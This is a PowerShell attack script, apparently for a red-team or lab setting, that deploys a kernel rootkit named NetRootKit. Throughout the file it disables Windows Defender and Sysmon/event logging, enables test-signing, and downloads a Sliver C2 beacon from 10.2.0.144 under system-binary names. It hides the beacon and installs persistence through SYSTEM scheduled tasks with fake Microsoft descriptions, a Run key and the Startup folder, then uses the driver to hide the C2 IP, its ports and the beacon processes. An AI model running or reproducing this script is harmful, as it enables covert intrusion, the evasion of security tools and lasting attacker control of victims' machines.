<#
.SYNOPSIS
    Deploys the NetRootKit kernel driver, disables Windows Defender, and hides a specific IP.

.DESCRIPTION
    This script performs the following actions:
    1. Disables Windows Defender and ETW telemetry (requires admin/SYSTEM privileges).
    2. Enables TESTSIGNING mode (requires a reboot if not already enabled).
    3. Uses devcon.exe to install the NetRootKit.sys kernel driver.
    4. Uses NetRootKitController.exe to hide the remote IP: 10.2.0.144.
    
    WARNING: Must be run as Administrator.
#>

$ErrorActionPreference = "Stop"

# --- 1. Prepare Environment (Create Temp Dir) ---
$BaseUrl = "https://github.com/KriyosArcane/NetRootKit/raw/refs/heads/master"
$TempDir = "C:\Windows\Temp\NRK"

Write-Host "[*] Creating temporary directory at $TempDir..."
if (-not (Test-Path $TempDir)) {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
}
Set-Location $TempDir

# --- 2. Disable Windows Defender & Tamper Protection ---
Write-Host "[*] Disabling Windows Defender and Real-Time Protection..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    
    # Attempt to add exclusions for the temporary directory
    Add-MpPreference -ExclusionPath $TempDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".sys", ".exe" -ErrorAction SilentlyContinue
    
    Write-Host "[+] Defender protections disabled."
} catch {
    Write-Host "[-] Failed to disable Defender (Tamper Protection may be on, or not running as Admin)."
}

# --- 3. Disable ETW Telementry (System-Wide) ---
Write-Host "[*] Patching ETW Providers..."
try {
    # Disable common ETW providers that EDRs use
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue
    logman stop EventLog-Application -ets -ErrorAction SilentlyContinue
    logman stop EventLog-System -ets -ErrorAction SilentlyContinue
    Write-Host "[+] ETW Telemetry degraded."
} catch {
    Write-Host "[-] Failed to modify ETW."
}

# --- 4. Download NetRootKit Components ---
$FilesToDownload = @(
    "NetRootKit.inf",
    "NetRootKit.sys",
    "NetRootKitController.exe",
    "netrootkit.cat",
    "devcon.exe",
    "winDefKiller.exe"
)

Write-Host "[*] Downloading NetRootKit components from GitHub..."
foreach ($File in $FilesToDownload) {
    if (-not (Test-Path $File)) {
        Write-Host "    -> Downloading $File..."
        Invoke-WebRequest -Uri "$BaseUrl/$File" -OutFile "$TempDir\$File" -UseBasicParsing
    }
}

# --- 4.5. Execute WinDefenderKiller ---
Write-Host "[*] Executing winDefKiller.exe to neutralize Windows Defender components..."
try {
    if (Test-Path "$TempDir\winDefKiller.exe") {
        Start-Process -FilePath "$TempDir\winDefKiller.exe" -NoNewWindow -Wait -ErrorAction SilentlyContinue
        Write-Host "[+] winDefKiller executed."
    } else {
        Write-Host "[-] winDefKiller.exe not found. Skipping."
    }
} catch {
    Write-Host "[-] Failed to execute winDefKiller."
}

# --- 5. Check / Enable TESTSIGNING ---
Write-Host "[*] Checking BCDEdit TESTSIGNING status..."
$bcd = bcdedit /enum '{current}'
if ($bcd -match "testsigning\s+Yes") {
    Write-Host "[+] TESTSIGNING is already ON."
} else {
    Write-Host "[!] TESTSIGNING is OFF. Enabling now..."
    bcdedit /set testsigning on
    Write-Host "[!] You MUST reboot the machine for TESTSIGNING to take effect. Run this script again after reboot."
    exit
}

# --- 6. Drop & Execute Multiple Sliver Beacons ---
Write-Host "[*] Staging Redundant Sliver Beacons..."
$BeaconDir = "C:\ProgramData\USOShared"
if (-not (Test-Path $BeaconDir)) {
    New-Item -ItemType Directory -Force -Path $BeaconDir | Out-Null
    Add-MpPreference -ExclusionPath $BeaconDir -ErrorAction SilentlyContinue
}

# Define the beacons
# 1. Hidden Scheduled Task
$Beacon1 = "$BeaconDir\svchost.exe"
# 2. Hidden Registry Run Key
$Beacon2 = "$BeaconDir\RuntimeBroker.exe"
# 3. Decoy Startup Folder
$StartupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$Beacon3 = "$StartupDir\dllhost.exe"

Write-Host "    -> Downloading primary beacon..."
if (-not (Test-Path $Beacon1)) {
    Invoke-WebRequest -Uri "http://10.2.0.144/svchost.exe" -OutFile $Beacon1 -UseBasicParsing -ErrorAction SilentlyContinue
    Unblock-File -Path $Beacon1 -ErrorAction SilentlyContinue
}

Write-Host "    -> Copying beacons for redundancy..."
if ((Test-Path $Beacon1) -and -not (Test-Path $Beacon2)) { Copy-Item $Beacon1 -Destination $Beacon2 -Force }
if ((Test-Path $Beacon1) -and -not (Test-Path $Beacon3)) { Copy-Item $Beacon1 -Destination $Beacon3 -Force }

$AllBeacons = @($Beacon1, $Beacon2, $Beacon3)

foreach ($b in $AllBeacons) {
    if (Test-Path $b) {
        Set-ItemProperty -Path $b -Name Attributes -Value "Hidden, System" -ErrorAction SilentlyContinue
    }
}

Write-Host "    -> Starting Beacons silently..."
foreach ($b in $AllBeacons) {
    # Using .NET GetFileNameWithoutExtension because Split-Path -LeafBase is only available in PowerShell Core (6.0+)
    $processCheck = Get-Process -Name ([System.IO.Path]::GetFileNameWithoutExtension($b)) -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $b}
    if (-not $processCheck -and (Test-Path $b)) {
        Start-Process -FilePath $b -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
Start-Sleep -Seconds 3

Write-Host "    -> Creating Diverse Persistence Mechanisms..."

# Persistence 1: Scheduled Task for svchost.exe
$BeaconTaskName = "USOSharedRuntimeUpdate"
$taskCheck = Get-ScheduledTask -TaskName $BeaconTaskName -ErrorAction SilentlyContinue
if (-not $taskCheck) {
    $BeaconAction = New-ScheduledTaskAction -Execute $Beacon1
    $BeaconTrigger = New-ScheduledTaskTrigger -AtStartup
    $BeaconPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $BeaconSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    Register-ScheduledTask -TaskName $BeaconTaskName -Action $BeaconAction -Trigger $BeaconTrigger -Principal $BeaconPrincipal -Settings $BeaconSettings -Description "Orchestrates user session shared runtime updates." -Force | Out-Null
}

# Persistence 2: Registry Run Key for RuntimeBroker.exe
$RegKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegValueName = "WindowsUpdateUUX"
Set-ItemProperty -Path $RegKey -Name $RegValueName -Value "`"$Beacon2`" /background" -ErrorAction SilentlyContinue

# Persistence 3: Startup Folder (dllhost.exe) is inherently persistent simply by being placed in the folder above.

# --- 7. Install & Start NetRootKit Driver ---
Write-Host "[*] Installing NetRootKit Driver via devcon.exe..."
if (-not (Test-Path "devcon.exe")) {
    Write-Host "[-] devcon.exe not found in current directory! Exiting."
    exit
}

if (-not (Test-Path "NetRootKit.inf")) {
    Write-Host "[-] NetRootKit.inf not found in current directory! Exiting."
    exit
}

# Run devcon to install the driver
$devconOutput = .\devcon.exe install NetRootKit.inf Root\NetRootKit
Write-Host $devconOutput

# IMPORTANT: devcon install registers the service, but it is set to SERVICE_DEMAND_START
# We must configure it to AUTOSTART for reboot persistence, and then start it manually now.
Write-Host "[*] Configuring the NetRootKit kernel service for AUTO start..."
sc.exe config NetRootKit start= auto | Out-Null

Write-Host "[*] Starting the NetRootKit kernel service..."
sc.exe start NetRootKit | Out-Null
Start-Sleep -Seconds 2

# --- 8. Interact with Kernel Driver & Setup Persistence ---
Write-Host "[*] Sending hide commands to NetRootKitController..."
if (-not (Test-Path "NetRootKitController.exe")) {
    Write-Host "[-] NetRootKitController.exe not found! Exiting."
    exit
}

# The IP, Ports, and Processes the user requested to hide
$TargetIP = "10.2.0.144"
$PortsToHide = @("8888", "8081")
$ProcessesToHide = @("svchost", "RuntimeBroker") # Intentionally LEAVING OUT "dllhost" so it serves as a decoy

Write-Host "[*] Checking connection to driver..."
.\NetRootKitController.exe check-connection "Ping"

Write-Host "[*] Hiding traffic for IP: $TargetIP"
$hideOut1 = .\NetRootKitController.exe hide-remote-ip $TargetIP
Write-Host $hideOut1

foreach ($Port in $PortsToHide) {
    Write-Host "[*] Hiding local port: $Port"
    $hideOut2 = .\NetRootKitController.exe hide-ip $Port
    Write-Host $hideOut2
}

foreach ($ProcName in $ProcessesToHide) {
    Write-Host "[*] Attempting to find and hide process: $ProcName..."
    $targetProcs = Get-Process -Name $ProcName -ErrorAction SilentlyContinue
    if ($targetProcs) {
        foreach ($p in $targetProcs) {
            Write-Host "    -> Hiding PID: $($p.Id)"
            $hideOut3 = .\NetRootKitController.exe hide-pid $($p.Id)
            Write-Host $hideOut3
        }
    } else {
        Write-Host "    -> Process $ProcName not found currently running. Skipping."
    }
}

Write-Host "[*] Creating Scheduled Task to persist IP, Port, and Process hiding across reboots..."
# Copy the controller somewhere safe where it won't be deleted so the scheduled task can find it
$PersistDir = "C:\Windows\System32\Tasks\NRK"
if (-not (Test-Path $PersistDir)) {
    New-Item -ItemType Directory -Force -Path $PersistDir | Out-Null
    Add-MpPreference -ExclusionPath $PersistDir -ErrorAction SilentlyContinue
}
Copy-Item ".\NetRootKitController.exe" -Destination "$PersistDir\svchost_net.exe" -Force

# Create a powershell script to run multiple controller commands sequentially on startup
$PSPath = "$PersistDir\UpdateNetwork.ps1"
$PSContent = @"
Start-Sleep -Seconds 10
cd "$PersistDir"
.\svchost_net.exe hide-remote-ip $TargetIP
.\svchost_net.exe hide-ip 8888
.\svchost_net.exe hide-ip 8081

`$hideprocs = @("svchost", "RuntimeBroker")
foreach (`$proc in `$hideprocs) {
    `$procs = Get-Process -Name `$proc -ErrorAction SilentlyContinue
    if (`$procs) {
        foreach (`$p in `$procs) {
            .\svchost_net.exe hide-pid `$p.Id
        }
    }
}
"@
Set-Content -Path $PSPath -Value $PSContent

# Create a scheduled task that runs as SYSTEM on startup to re-apply the IP/Port hiding script
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineNet" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Keeps Edge network components updated." -Force | Out-Null

Write-Host "[+] Reboot Persistence Configured!"
Write-Host "[+] NetRootKit deployed successfully!"
